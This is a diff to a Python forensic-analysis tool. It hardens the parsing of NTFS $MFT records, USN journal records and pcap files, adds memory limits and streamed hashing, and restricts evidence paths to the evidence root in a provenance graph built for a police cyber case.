@@ -168,6 +168,11 @@ BINDING_RELATIONS = frozenset({REL_OWNS, REL_LOGGED_IN_AS, REL_EXECUTED, REL_EPO
 PROCESS_ACTION_RELATIONS = frozenset({REL_SPAWNED, REL_CONNECTED_TO, REL_WROTE_FILE, REL_INJECTED_INTO,
                                       REL_READ_FILE})
 
+# Two steps with the same time and the same byte offset come from one record (a Sysmon process-create
+# names the child, whose own action may be logged in the same line): a creation is told before what
+# the created process or package then does, never in hash order.
+CAUSAL_RANK = {REL_SPAWNED: 0, REL_INSTALLED: 0}
+
 # Code injection (Sysmon 8) and loading an unsigned / user-writable module (Sysmon 7): the relations
 # that taint a broker. Injection that happened before capture, or by a route no sensor logged, cannot
 # be seen here; see AntiSupernodeEngine for how such brokers are kept from muting their own children.
@@ -227,10 +232,38 @@ LOSS_MAX_Q16 = Q16              # anomaly score 1.0
 NS = 1_000_000_000
 FILETIME_EPOCH_DIFF = 116444736000000000   # 100-ns ticks between 1601-01-01 and 1970-01-01
 IST = datetime.timezone(datetime.timedelta(minutes=330))
+_EPOCH_UTC = datetime.datetime(1970, 1, 1, tzinfo=datetime.timezone.utc)
+
+# Defaults sized for the 422 MB laptop budget of the whole pipeline: the storyline solver holds about
+# 0.7 KB per live edge and the attack-graph export about 3-4 KB per exported edge (measured), so the
+# ring keeps 250,000 edges and the export carries the 50,000 most suspicious (the rest is counted).
+DEFAULT_CAPACITY = 250_000
+DEFAULT_EXPORT_MAX_EDGES = 50_000
+MEMORY_BUDGET_BYTES = 422 * 1024 * 1024
+PCAP_MAX_RECORD = 262_144       # libpcap MAXIMUM_SNAPLEN; a larger incl_len is a corrupt record header
+UNREADABLE_CAP = 1000           # unreadable-record entries kept per graph (all are counted)
 
 
 class ProvenanceError(ValueError):
     """An edge was offered without a complete physical anchor (Section 63 BSA rule)."""
+
+
+class IntegrityError(ValueError):
+    """A Sector A / Sector B input fails its own digest or is bound to another case or acquisition."""
+
+
+# What malformed input content raises while it is converted (never ProvenanceError, which is caught first).
+_MALFORMED_ERRORS = (ValueError, TypeError, KeyError, AttributeError, IndexError, OverflowError, struct.error,
+                     RecursionError)
+
+
+class CaptureFormatError(ValueError):
+    """A packet-capture record header is corrupt, or the capture ends inside a record."""
+
+    def __init__(self, reason: str, byte_offset: int):
+        super().__init__(f"{reason} at byte {byte_offset}")
+        self.reason = reason
+        self.byte_offset = byte_offset
 
 
 # --------------------------------------------------------------------------- #
@@ -246,6 +279,22 @@ def canonical_json(obj: Any) -> bytes:
     return json.dumps(obj, sort_keys=True, separators=(",", ":"), ensure_ascii=False, allow_nan=False).encode()
 
 
+def canonical_sha256(obj: Any) -> str:
+    """SHA-256 of canonical_json(obj), streamed chunk by chunk so a large document is never held as one string."""
+    h = hashlib.sha256()
+    enc = json.JSONEncoder(sort_keys=True, separators=(",", ":"), ensure_ascii=False, allow_nan=False)
+    buf: List[str] = []
+    size = 0
+    for chunk in enc.iterencode(obj):
+        buf.append(chunk)
+        size += len(chunk)
+        if size >= 1 << 16:
+            h.update("".join(buf).encode())
+            buf, size = [], 0
+    h.update("".join(buf).encode())
+    return h.hexdigest()
+
+
 def score_to_q16(score: Optional[float]) -> int:
     if score is None or not isinstance(score, (int, float)) or score != score or score in (math.inf, -math.inf):
         return 0
@@ -257,11 +306,20 @@ def q16_to_score(q: int) -> float:
 
 
 def ns_to_iso(ns: int) -> Optional[str]:
+    """
+    Unix ns -> 'YYYY-MM-DDTHH:MM:SS.fffffffffZ'. Pure calendar arithmetic, no gmtime(): Windows' gmtime_s
+    rejects times before 1970, and a stomped FILETIME may lie anywhere in 1601-30828. A value outside
+    years 1-9999 is returned as 'OUT_OF_RANGE:<ns>' so that it is reported, not raised.
+    """
     if not ns:
         return None
-    sec, rem = divmod(int(ns), NS)
-    dt = datetime.datetime.fromtimestamp(sec, tz=datetime.timezone.utc)
-    return dt.strftime("%Y-%m-%dT%H:%M:%S.") + f"{rem:09d}Z"
+    try:
+        sec, rem = divmod(int(ns), NS)
+        dt = _EPOCH_UTC + datetime.timedelta(seconds=sec)
+    except (OverflowError, ValueError, TypeError):
+        return f"OUT_OF_RANGE:{ns}"
+    return (f"{dt.year:04d}-{dt.month:02d}-{dt.day:02d}T{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d}."
+            f"{rem:09d}Z")
 
 
 def iso_to_ns(value: Any, default_tz: datetime.tzinfo = datetime.timezone.utc) -> int:
@@ -815,20 +873,51 @@ def build_mft_record(record_number: int, name: str, parent_record: int, si_times
     return bytes(rec)
 
 
+def _mft_error(buf: bytes, byte_offset: int, why: str) -> Dict[str, Any]:
+    """An unreadable $MFT slot, with the same anchor keys as a parsed record so it can be reported and quarantined."""
+    rn = struct.unpack_from("<I", buf, 0x2C)[0] if len(buf) >= 0x30 and buf[:4] == b"FILE" else None
+    return {"byte_offset": byte_offset, "length": len(buf), "sha256": _sha256_hex(bytes(buf)), "record_number": rn,
+            "error": why}
+
+
 def parse_mft_record(buf: bytes, byte_offset: int = 0) -> Optional[Dict[str, Any]]:
-    """Parse one FILE record (fixups verified and undone). Returns None for empty/non-FILE slots."""
-    if len(buf) < 0x30 or buf[:4] != b"FILE":
-        return None
+    """
+    Parse one FILE record (fixups verified and undone). Returns None only for an empty (all-zero) slot.
+    Any other slot that is not a readable FILE record ('BAAD', another signature, torn fixups, header or
+    attribute fields pointing outside the record) is returned as {byte_offset, length, sha256,
+    record_number, error}: reported by the caller, never skipped silently and never raised.
+    """
+    n = len(buf)
+    if n < 0x30 or buf[:4] != b"FILE":
+        if buf.count(0) == n:
+            return None
+        sig = bytes(buf[:4])
+        if sig == b"BAAD":
+            return _mft_error(buf, byte_offset, "BAAD_RECORD (multi-sector transfer failed; NTFS marked it bad)")
+        if sig == b"FILE":
+            return _mft_error(buf, byte_offset, f"SHORT_RECORD ({n} bytes)")
+        return _mft_error(buf, byte_offset, f"UNKNOWN_SIGNATURE {sig.hex()} (not a FILE record)")
+    try:
+        return _parse_file_record(buf, byte_offset)
+    except (struct.error, IndexError, ValueError) as exc:     # last resort: a field the checks below missed
+        return _mft_error(buf, byte_offset, f"MALFORMED_RECORD ({type(exc).__name__}: {exc})")
+
+
+def _parse_file_record(buf: bytes, byte_offset: int) -> Dict[str, Any]:
+    n = len(buf)
     usa_off, usa_cnt = struct.unpack_from("<HH", buf, 4)
     rec = bytearray(buf)
     if usa_cnt:
+        if usa_off < 0x28 or usa_off + 2 * usa_cnt > n or usa_cnt > n // 512 + 1:
+            return _mft_error(buf, byte_offset, f"MALFORMED_RECORD (update sequence array at {usa_off:#x} x {usa_cnt} "
+                                                f"lies outside the {n}-byte record)")
         usa = struct.unpack_from(f"<{usa_cnt}H", rec, usa_off)
         for i in range(1, usa_cnt):
             end = i * 512
             if end > len(rec):
                 break
             if struct.unpack_from("<H", rec, end - 2)[0] != usa[0]:
-                return {"byte_offset": byte_offset, "error": "FIXUP_MISMATCH (torn or altered record)"}
+                return _mft_error(buf, byte_offset, "FIXUP_MISMATCH (torn or altered record)")
             struct.pack_into("<H", rec, end - 2, usa[i])
     lsn, = struct.unpack_from("<Q", rec, 0x08)
     seq, _links, first_attr, flags = struct.unpack_from("<HHHH", rec, 0x10)
@@ -840,11 +929,17 @@ def parse_mft_record(buf: bytes, byte_offset: int = 0) -> Optional[Dict[str, Any
     pos = first_attr
     while pos + 8 <= len(rec):
         atype, alen = struct.unpack_from("<II", rec, pos)
-        if atype == ATTR_END or alen == 0 or pos + alen > len(rec):
+        if atype == ATTR_END or alen == 0:
             break
+        if alen < 0x18 or pos + alen > len(rec):
+            return _mft_error(buf, byte_offset, f"MALFORMED_RECORD (attribute {atype:#x} at {pos:#x}, length {alen}, "
+                                                f"runs outside the record)")
         non_resident = rec[pos + 8]
         if not non_resident:
             clen, coff = struct.unpack_from("<IH", rec, pos + 0x10)
+            if coff + clen > alen:
+                return _mft_error(buf, byte_offset, f"MALFORMED_RECORD (attribute {atype:#x} at {pos:#x}: content "
+                                                    f"{coff:#x}+{clen} exceeds its length {alen})")
             c = bytes(rec[pos + coff:pos + coff + clen])
             if atype == ATTR_STANDARD_INFORMATION and len(c) >= 0x20:
                 out["si"] = dict(zip("BMCA", struct.unpack_from("<4Q", c, 0)))
@@ -869,6 +964,57 @@ def parse_mft(data: bytes, base_offset: int = 0, record_size: int = MFT_RECORD_S
     return out
 
 
+class _MftRec:
+    """
+    One parsed FILE record held compactly while a whole $MFT extent is analysed: about a third of the
+    dict parse_mft_record returns (a system volume has 10^5-10^6 records). It reads like that dict,
+    r["lsn"], r.get("si")["B"], r.get("error") (None), so AntiTimestompEngine takes either.
+    """
+
+    __slots__ = ("byte_offset", "length", "_sha", "record_number", "sequence", "lsn", "_flags", "si_usn", "_times",
+                 "name", "parent_record")
+    _KEYS = frozenset({"byte_offset", "length", "sha256", "record_number", "sequence", "lsn", "in_use", "is_dir",
+                       "si", "si_usn", "fn", "name", "parent_record"})
+
+    def __init__(self, r: Dict[str, Any]):
+        self.byte_offset, self.record_number, self.sequence = r["byte_offset"], r["record_number"], r["sequence"]
+        self.length = MFT_RECORD_SIZE if r["length"] == MFT_RECORD_SIZE else r["length"]
+        self._sha = bytes.fromhex(r["sha256"])
+        self.lsn, self.si_usn, self.name, self.parent_record = r["lsn"], r["si_usn"], r["name"], r["parent_record"]
+        si, fn = r.get("si"), r.get("fn")
+        self._flags = (r["in_use"] and 1) | (r["is_dir"] and 2) | (4 if si else 0) | (8 if fn else 0)
+        self._times = struct.pack("<8Q", *([si[k] for k in "BMCA"] if si else [0] * 4),
+                                  *([fn[k] for k in "BMCA"] if fn else [0] * 4))
+
+    @property
+    def sha256(self) -> str:
+        return self._sha.hex()
+
+    @property
+    def in_use(self) -> bool:
+        return bool(self._flags & 1)
+
+    @property
+    def is_dir(self) -> bool:
+        return bool(self._flags & 2)
+
+    @property
+    def si(self) -> Optional[Dict[str, int]]:
+        return dict(zip("BMCA", struct.unpack_from("<4Q", self._times, 0))) if self._flags & 4 else None
+
+    @property
+    def fn(self) -> Optional[Dict[str, int]]:
+        return dict(zip("BMCA", struct.unpack_from("<4Q", self._times, 32))) if self._flags & 8 else None
+
+    def get(self, key: str, default: Any = None) -> Any:
+        return getattr(self, key) if key in self._KEYS else default
+
+    def __getitem__(self, key: str) -> Any:
+        if key not in self._KEYS:
+            raise KeyError(key)
+        return getattr(self, key)
+
+
 def resolve_mft_paths(records: Sequence[Dict[str, Any]], root_record: int = 5, drive: str = "C:") -> Dict[int, str]:
     by_num = {r["record_number"]: r for r in records if r.get("name") is not None}
     paths: Dict[int, str] = {}
@@ -886,6 +1032,9 @@ def resolve_mft_paths(records: Sequence[Dict[str, Any]], root_record: int = 5, d
     for n in sorted(by_num):
         if n != root_record:
             path_of(n)
+    # path_of refers to itself (a reference cycle that only the cyclic GC frees): empty by_num so that
+    # cycle does not keep every parsed $MFT record alive after the caller is done with them
+    by_num.clear()
     return paths
 
 
@@ -904,6 +1053,85 @@ def build_usn_stream(entries: Sequence[Tuple[int, int, int, int, str]], sparse_p
     return bytes(out)
 
 
+class _UsnWalker:
+    """
+    Incremental walk over USN_RECORD_V2 records, shared by parse_usn_journal (a whole extent in memory) and
+    ingest_ntfs (the extent fed in bounded chunks). A record cut by a chunk boundary waits for the next
+    chunk; at the end of the extent it is an error, exactly as in a one-shot walk. A record length above
+    MAX_RECORD cannot be a USN record (a V2 record is at most 60 + 2 * 255 bytes) and is an error at once,
+    so a corrupt length never makes the walk buffer the rest of the extent. `keep(rec)` decides which
+    parsed records are retained (all by default); every record is checked for Invariant 4 either way.
+    """
+
+    MAX_RECORD = 1 << 16
+
+    def __init__(self, base_offset: int = 0, stream_offset: int = 0, rollback_tolerance_ns: int = 2 * NS,
+                 keep: Optional[Callable[[Dict[str, Any]], bool]] = None):
+        self.base_offset, self.stream_offset, self.tolerance = base_offset, stream_offset, rollback_tolerance_ns
+        self.keep = keep
+        self.records: List[Dict[str, Any]] = []
+        self.violations: List[Dict[str, Any]] = []
+        self.errors: List[Dict[str, Any]] = []
+        self.last_usn, self.last_ts = -1, None
+        self._carry, self._carry_at = b"", 0      # unparsed tail and its offset from the start of the extent
+
+    def feed(self, chunk: bytes, final: bool = False) -> None:
+        data = self._carry + chunk if self._carry else chunk
+        at = self._carry_at
+        pos, n = 0, len(data)
+        while pos + 8 <= n:
+            rlen = struct.unpack_from("<I", data, pos)[0]
+            if rlen == 0:
+                pos += 8
+                continue
+            if rlen < USN_V2.size or rlen % 8 or rlen > self.MAX_RECORD or (pos + rlen > n and final):
+                self.errors.append({"byte_offset": self.base_offset + at + pos, "error": f"bad record length {rlen}"})
+                pos += 8
+                continue
+            if pos + rlen > n:
+                break                               # the record continues in the next chunk
+            self._record(data, pos, rlen, at)
+            pos += rlen
+        if final:
+            self._carry, self._carry_at = b"", at + n
+        else:
+            self._carry, self._carry_at = bytes(data[pos:]), at + pos
+
+    def _record(self, data: bytes, pos: int, rlen: int, at: int) -> None:
+        (_, major, _minor, file_ref, parent_ref, usn, ts, reason, _si, _sec, _attrs,
+         name_len, name_off) = USN_V2.unpack_from(data, pos)
+        off = self.base_offset + at + pos
+        if major != 2:
+            self.errors.append({"byte_offset": off, "error": f"unsupported USN record v{major}"})
+            return
+        name = data[pos + name_off:min(pos + rlen, pos + name_off + name_len)].decode("utf-16-le", "replace")
+        rec = {"byte_offset": off, "length": rlen, "sha256": _sha256_hex(data[pos:pos + rlen]), "usn": usn,
+               "file_record": file_ref & 0xFFFFFFFFFFFF, "parent_record": parent_ref & 0xFFFFFFFFFFFF,
+               "timestamp_ns": filetime_to_ns(ts), "reason": reason, "name": name}
+        expected = self.stream_offset + at + pos
+        if usn != expected:
+            self.violations.append({"rule": "USN_NOT_EQUAL_STREAM_OFFSET", "byte_offset": off,
+                                    "usn": usn, "expected_usn": expected})
+        if usn <= self.last_usn:
+            self.violations.append({"rule": "USN_NOT_MONOTONIC", "byte_offset": off, "usn": usn,
+                                    "previous_usn": self.last_usn})
+        if self.last_ts is not None and rec["timestamp_ns"] < self.last_ts - self.tolerance:
+            self.violations.append({"rule": "JOURNAL_TIME_ROLLBACK", "byte_offset": off,
+                                    "timestamp_utc": ns_to_iso(rec["timestamp_ns"]), "previous_utc": ns_to_iso(self.last_ts)})
+        self.last_usn = max(self.last_usn, usn)
+        self.last_ts = rec["timestamp_ns"] if self.last_ts is None else max(self.last_ts, rec["timestamp_ns"])
+        if self.keep is None or self.keep(rec):
+            self.records.append(rec)
+
+    def result(self) -> Dict[str, Any]:
+        creates: Dict[int, Dict[str, Any]] = {}
+        for r in self.records:
+            if r["reason"] & USN_REASON_FILE_CREATE and r["file_record"] not in creates:
+                creates[r["file_record"]] = r
+        return {"records": self.records, "violations": self.violations, "errors": self.errors, "creates": creates,
+                "append_only_ok": not self.violations and not self.errors}
+
+
 def parse_usn_journal(data: bytes, base_offset: int = 0, stream_offset: int = 0,
                       rollback_tolerance_ns: int = 2 * NS) -> Dict[str, Any]:
     """
@@ -912,49 +1140,9 @@ def parse_usn_journal(data: bytes, base_offset: int = 0, stream_offset: int = 0,
     strictly increase; a timestamp running backwards by more than rollback_tolerance_ns is
     reported (clock change or spliced records).
     """
-    records, violations, errors = [], [], []
-    pos, n = 0, len(data)
-    last_usn, last_ts = -1, None
-    while pos + 8 <= n:
-        rlen = struct.unpack_from("<I", data, pos)[0]
-        if rlen == 0:
-            pos += 8
-            continue
-        if rlen < USN_V2.size or rlen % 8 or pos + rlen > n:
-            errors.append({"byte_offset": base_offset + pos, "error": f"bad record length {rlen}"})
-            pos += 8
-            continue
-        (_, major, _minor, file_ref, parent_ref, usn, ts, reason, _si, _sec, _attrs,
-         name_len, name_off) = USN_V2.unpack_from(data, pos)
-        if major != 2:
-            errors.append({"byte_offset": base_offset + pos, "error": f"unsupported USN record v{major}"})
-            pos += rlen
-            continue
-        name = data[pos + name_off:pos + name_off + name_len].decode("utf-16-le", "replace")
-        raw = data[pos:pos + rlen]
-        rec = {"byte_offset": base_offset + pos, "length": rlen, "sha256": _sha256_hex(raw), "usn": usn,
-               "file_record": file_ref & 0xFFFFFFFFFFFF, "parent_record": parent_ref & 0xFFFFFFFFFFFF,
-               "timestamp_ns": filetime_to_ns(ts), "reason": reason, "name": name}
-        expected = stream_offset + pos
-        if usn != expected:
-            violations.append({"rule": "USN_NOT_EQUAL_STREAM_OFFSET", "byte_offset": rec["byte_offset"],
-                               "usn": usn, "expected_usn": expected})
-        if usn <= last_usn:
-            violations.append({"rule": "USN_NOT_MONOTONIC", "byte_offset": rec["byte_offset"], "usn": usn,
-                               "previous_usn": last_usn})
-        if last_ts is not None and rec["timestamp_ns"] < last_ts - rollback_tolerance_ns:
-            violations.append({"rule": "JOURNAL_TIME_ROLLBACK", "byte_offset": rec["byte_offset"],
-                               "timestamp_utc": ns_to_iso(rec["timestamp_ns"]), "previous_utc": ns_to_iso(last_ts)})
-        last_usn = max(last_usn, usn)
-        last_ts = rec["timestamp_ns"] if last_ts is None else max(last_ts, rec["timestamp_ns"])
-        records.append(rec)
-        pos += rlen
-    creates: Dict[int, Dict[str, Any]] = {}
-    for r in records:
-        if r["reason"] & USN_REASON_FILE_CREATE and r["file_record"] not in creates:
-            creates[r["file_record"]] = r
-    return {"records": records, "violations": violations, "errors": errors, "creates": creates,
-            "append_only_ok": not violations and not errors}
+    w = _UsnWalker(base_offset, stream_offset, rollback_tolerance_ns)
+    w.feed(data, final=True)
+    return w.result()
 
 
 class _FenwickMax:
@@ -1160,9 +1348,19 @@ class AntiTimestompEngine:
             for v in journal["violations"]:
                 findings.append(dict(v, invariant=4, grade="STRONG" if v["rule"] != "JOURNAL_TIME_ROLLBACK" else "INDICATIVE"))
         per_record: Dict[int, Dict[str, Any]] = {}
+        by_rec: Dict[Any, List[Dict[str, Any]]] = defaultdict(list)
+        for f in findings:
+            by_rec[f.get("record")].append(f)
+        clean: Dict[Any, Dict[str, Any]] = {}      # one shared verdict object per clean class, not one per file
         for r in live:
             n = r["record_number"]
-            fs = [f for f in findings if f.get("record") == n]
+            fs = by_rec.get(n, [])
+            if not fs and classes.get(n) not in ("ARCHIVE_EXTRACTION_OR_RESTORE", "BENIGN_COPY"):
+                cls = classes.get(n)
+                if cls not in clean:
+                    clean[cls] = {"verdict": "CONSISTENT", "invariants_failed": [], "copy_class": cls}
+                per_record[n] = clean[cls]
+                continue
             strong = [f for f in fs if f.get("grade") in ("PROVEN", "STRONG")]
             cls = classes.get(n)
             if strong:
@@ -1427,6 +1625,91 @@ def iter_lines_with_offsets(path: str) -> Iterator[Tuple[int, bytes]]:
             off += len(raw)
 
 
+def _find_unique(path: str, needle: bytes, chunk: int = 1 << 20) -> Tuple[int, int]:
+    """
+    (file offset of the first occurrence, number of occurrences counted up to 2) of `needle` in a file.
+    Read in chunks that carry len(needle) - 1 bytes over, so a document of any size is searched in
+    bounded memory and a match across a chunk boundary is neither missed nor counted twice.
+    """
+    first, count, base, tail = -1, 0, 0, b""
+    with open(path, "rb") as f:
+        while count < 2:
+            data = f.read(chunk)
+            if not data:
+                break
+            buf = tail + data
+            i = buf.find(needle)
+            while i >= 0 and count < 2:
+                if first < 0:
+                    first = base + i
+                count += 1
+                i = buf.find(needle, i + 1)
+            keep = min(len(needle) - 1, len(buf))
+            tail = buf[len(buf) - keep:] if keep > 0 else b""
+            base += len(buf) - len(tail)
+    return first, count
+
+
+def _sniff_text_encoding(head: bytes) -> Tuple[str, int]:
+    """(codec, BOM length) of a text log: UTF-8 (BOM optional) or UTF-16 LE/BE (BOM, or NULs in every other byte)."""
+    if head.startswith(b"\xef\xbb\xbf"):
+        return "utf-8", 3
+    if head.startswith(b"\xff\xfe"):
+        return "utf-16-le", 2
+    if head.startswith(b"\xfe\xff"):
+        return "utf-16-be", 2
+    if len(head) >= 4 and head[0] and not head[1] and head[2] and not head[3]:
+        return "utf-16-le", 0
+    if len(head) >= 4 and not head[0] and head[1] and not head[2] and head[3]:
+        return "utf-16-be", 0
+    return "utf-8", 0
+
+
+def iter_text_lines_with_offsets(path: str) -> Iterator[Tuple[int, bytes, str]]:
+    """
+    Stream (byte offset, raw line bytes without CR/LF and BOM, codec) from a text log. UTF-8 files behave
+    exactly like iter_lines_with_offsets; UTF-16 files (Windows PowerShell 5.1 Out-File, many Windows log
+    exporters) are split on the 2-byte newline at even offsets only, so offsets and lengths stay exact
+    byte ranges of the file and a code unit is never cut in half. Decode with raw.decode(codec).
+    """
+    with open(path, "rb") as f:
+        codec, bom = _sniff_text_encoding(f.read(4))
+        f.seek(bom)
+        if codec == "utf-8":
+            off = bom
+            for raw in f:
+                line = raw.rstrip(b"\r\n")
+                if line:
+                    yield off, line, codec
+                off += len(raw)
+            return
+        nl, cr = (b"\n\x00", b"\r\x00") if codec == "utf-16-le" else (b"\x00\n", b"\x00\r")
+        buf, base = b"", bom             # base: file offset of buf[0]; always even relative to the text start
+        while True:
+            chunk = f.read(1 << 20)
+            buf += chunk
+            pos = 0
+            while True:
+                i = buf.find(nl, pos)
+                while i >= 0 and (i - pos) % 2:
+                    i = buf.find(nl, i + 1)
+                if i < 0:
+                    break
+                line = buf[pos:i]
+                if line.endswith(cr):
+                    line = line[:-2]
+                if line:
+                    yield base + pos, line, codec
+                pos = i + 2
+            buf, base = buf[pos:], base + pos
+            if not chunk:
+                if buf.endswith(cr):
+                    buf = buf[:-2]
+                if buf:
+                    yield base, buf, codec
+                return
+
+
 PCAP_MAGIC = {b"\xd4\xc3\xb2\xa1": ("<", 1000), b"\xa1\xb2\xc3\xd4": (">", 1000),
               b"\x4d\x3c\xb2\xa1": ("<", 1), b"\xa1\xb2\x3c\x4d": (">", 1)}
 
@@ -1436,6 +1719,9 @@ def iter_pcap_tcp_syns(path: str) -> Iterator[Dict[str, Any]]:
     Stream TCP SYN (no ACK) packets over IPv4/IPv6 from a classic libpcap file (Ethernet or raw IP).
     Each item carries the byte offset and length of the whole packet record (16-byte record
     header + captured bytes), so the anchor covers exactly what Wireshark shows as that frame.
+    A record header whose incl_len exceeds orig_len or PCAP_MAX_RECORD (one flipped bit), or a capture
+    that ends inside a record, raises CaptureFormatError(reason, byte_offset) after the packets before
+    it: the rest of the file cannot be re-synchronised, and that must be reported, not look like the end.
     """
     with open(path, "rb") as f:
         gh = f.read(24)
@@ -1446,12 +1732,16 @@ def iter_pcap_tcp_syns(path: str) -> Iterator[Dict[str, Any]]:
         off = 24
         while True:
             rh = f.read(16)
-            if len(rh) < 16:
+            if not rh:
                 return
-            ts_s, ts_frac, incl, _orig = struct.unpack(endian + "IIII", rh)
+            if len(rh) < 16:
+                raise CaptureFormatError("TRUNCATED_CAPTURE", off)
+            ts_s, ts_frac, incl, orig = struct.unpack(endian + "IIII", rh)
+            if incl > PCAP_MAX_RECORD or incl > orig:
+                raise CaptureFormatError("PCAP_RECORD_CORRUPT", off)
             data = f.read(incl)
             if len(data) < incl:
-                return
+                raise CaptureFormatError("TRUNCATED_CAPTURE", off)
             rec_off, rec_len = off, 16 + incl
             off += rec_len
             p = 0
@@ -1501,6 +1791,8 @@ def build_pcap(packets: Sequence[Tuple[int, str, int, str, int, int]]) -> bytes:
 
 _FULL_URL_RX = re.compile(r"(?i)\b(?:https?|ftp)://\[?([0-9a-z.\-:]+?)\]?(?::(\d{1,5}))?(/[^\s'\";|]*)?(?=['\"\s);|]|$)")
 _URL_RX = re.compile(r"(?i)\b(?:https?|ftp)://\[?([0-9a-z.\-:]+?)\]?(?::(\d{1,5}))?(?=[/'\"\s)]|$)")
+_SCHEME_URL_RX = re.compile(r"(?i)\b(https?|ftp)://\[?([0-9a-z.\-:]+?)\]?(?::(\d{1,5}))?(?=[/'\"\s)]|$)")
+_DEFAULT_PORT = {"http": 80, "https": 443, "ftp": 21}
 _WIN_PATH_RX = re.compile(r"(?i)\b([a-z]:\\[^'\"<>|\r\n]*?\.(?:exe|dll|ps1|bat|vbs|scr|js|hta|apk|zip))\b")
 _IMPERSONATION_RX = re.compile(r"(?i)\b(cbi|police|crime\s*branch|customs|narcotics|ncb|\bed\b|enforcement|"
                                r"trai|rbi|court|judge|income\s*tax|cyber\s*cell)\b")
@@ -1512,6 +1804,19 @@ def _is_public_ip(ip: str) -> bool:
         return ipaddress.ip_address(ip).is_global
     except ValueError:
         return False
+
+
+def _port(value: Any) -> Optional[int]:
+    """A TCP/UDP port from a log field (int, integral float or digit string); 0 if absent, None if unreadable."""
+    if value is None or value == "":
+        return 0
+    if isinstance(value, bool):
+        return None
+    if isinstance(value, float) and value.is_integer():
+        value = int(value)
+    if isinstance(value, str) and value.strip().isdigit():
+        value = int(value.strip())
+    return value if isinstance(value, int) and 0 <= value <= 65535 else None
 
 
 # --------------------------------------------------------------------------- #
@@ -1538,7 +1843,7 @@ class TemporalProvenanceGraph:
 
     PENDING_CAP = 65_536
 
-    def __init__(self, case_id: str = "FIR-042/2026-CYBER", capacity: int = 1_000_000,
+    def __init__(self, case_id: str = "FIR-042/2026-CYBER", capacity: int = DEFAULT_CAPACITY,
                  ledger_path: Optional[str] = None, gamma: float = 1.5, output_dir: Optional[str] = None,
                  evidence_root: Optional[str] = None, verify_anchors: bool = True,
                  local_tz_minutes: int = 330, artifact_paths: Optional[Dict[str, str]] = None,
@@ -1571,7 +1876,11 @@ class TemporalProvenanceGraph:
         self.sector_size = 4096
         self.vault_files: Set[str] = set()
         self.timestomp_report: Dict[str, Any] = {"findings": [], "per_record": {}, "journal_append_only_ok": None,
-                                                 "quarantined_records": []}
+                                                 "quarantined_records": [], "unreadable_records": [],
+                                                 "unreadable_count": 0}
+        self.time_anomalies: List[Dict[str, Any]] = []      # record times outside 1970..2554, kept as TIME_UNKNOWN
+        self._time_anomaly_keys: Set[str] = set()
+        self._auto_source_names: Dict[str, str] = {}
         self.causality_report: Optional[Dict[str, Any]] = None
         self.lead_edges: Dict[str, List[int]] = {}
         self.leads_rejected: List[Dict[str, Any]] = []
@@ -1587,21 +1896,68 @@ class TemporalProvenanceGraph:
 
     # ----- anchors --------------------------------------------------------- #
 
+    @staticmethod
+    def _within(path: str, root: str) -> bool:
+        """True when `path` (symlinks resolved) lies inside `root`."""
+        try:
+            rp = os.path.normcase(os.path.realpath(path))
+            rr = os.path.normcase(os.path.realpath(root))
+            return os.path.commonpath([rp, rr]) == rr
+        except (ValueError, OSError):      # different drives on Windows, unreadable path
+            return False
+
+    def _candidate_path(self, source_file: str) -> str:
+        """Where a manifest-named file would be: under the evidence root (the working folder when none is set)."""
+        root = self.evidence_root or os.getcwd()
+        return source_file if os.path.isabs(source_file) else os.path.join(root, source_file)
+
     def _resolve_source(self, source_file: str) -> Optional[str]:
-        if not source_file:
+        """
+        A file this graph registered itself (telemetry it parsed, artifact_paths), else a file inside the
+        evidence root. A manifest cannot point outside the root ('../..', an absolute path elsewhere, the
+        examiner's working folder): such a file is not resolved and its anchor is refused.
+        """
+        if not source_file or not isinstance(source_file, str):
             return None
         if source_file in self.source_paths:
             return self.source_paths[source_file]
         if source_file.startswith("artifact:"):
             p = self.artifact_paths.get(source_file[len("artifact:"):])
             return p if p and os.path.isfile(p) else None
-        if os.path.isabs(source_file) and os.path.isfile(source_file):
-            return source_file
-        if self.evidence_root:
-            p = os.path.join(self.evidence_root, source_file)
-            if os.path.isfile(p):
-                return p
-        return source_file if os.path.isfile(source_file) else None
+        p = self._candidate_path(source_file)
+        if os.path.isfile(p) and self._within(p, self.evidence_root or os.getcwd()):
+            return p
+        return None
+
+    def _source_name(self, path: str, display: Optional[str]) -> str:
+        """
+        Section 63 name of a file this graph reads: the caller's display name, else the path relative to the
+        evidence root, else the base name. Two different files never share a name: a clash of automatic
+        names falls back to the absolute path; an explicit display name that is taken raises.
+        """
+        ap = os.path.abspath(path)
+        if display:
+            prior = self.source_paths.get(display)
+            if prior is not None and os.path.normcase(prior) != os.path.normcase(ap):
+                raise ProvenanceError(f"DUPLICATE_SOURCE_NAME:{display}")
+            self.source_paths[display] = ap
+            return display
+        name = self._auto_source_names.get(ap)
+        if name is None:
+            name = os.path.basename(ap)
+            if self.evidence_root:
+                try:
+                    rel = os.path.relpath(ap, os.path.abspath(self.evidence_root))
+                except ValueError:
+                    rel = ""
+                if rel and not os.path.isabs(rel) and rel != os.pardir and not rel.startswith(os.pardir + os.sep):
+                    name = rel.replace(os.sep, "/")
+            prior = self.source_paths.get(name)
+            if prior is not None and os.path.normcase(prior) != os.path.normcase(ap):
+                name = ap.replace(os.sep, "/")
+            self._auto_source_names[ap] = name
+        self.source_paths[name] = ap
+        return name
 
     def _rehash(self, path: str, off: int, length: int, fresh: bool = False) -> Optional[str]:
         key = (path, off, length)
@@ -1646,15 +2002,23 @@ class TemporalProvenanceGraph:
         off, length, sha = anchor.get("byte_offset"), anchor.get("length"), anchor.get("sha256")
         if not src:
             raise ProvenanceError("MISSING_SOURCE_FILE")
+        if not isinstance(src, str):
+            raise ProvenanceError("MALFORMED_ANCHOR:source_file is not a string")
         if not isinstance(off, int) or isinstance(off, bool) or off < 0:
             raise ProvenanceError("MISSING_BYTE_OFFSET")
         if not isinstance(length, int) or isinstance(length, bool) or length <= 0:
             raise ProvenanceError("MISSING_LENGTH")
         if not isinstance(sha, str) or not re.fullmatch(r"[0-9a-f]{64}", sha):
             raise ProvenanceError("MISSING_SHA256")
+        if length >= 1 << 32 or off + length >= 1 << 63:
+            # the ledger stores u32 length / u64 offset; refuse here, before anything is re-hashed or stored
+            raise ProvenanceError("ANCHOR_OUT_OF_RANGE")
         basis = anchor.get("offset_basis", "FILE")
+        stype = anchor.get("source_type", "")
+        if not isinstance(basis, str) or not isinstance(stype, str):
+            raise ProvenanceError("MALFORMED_ANCHOR:offset_basis/source_type is not a string")
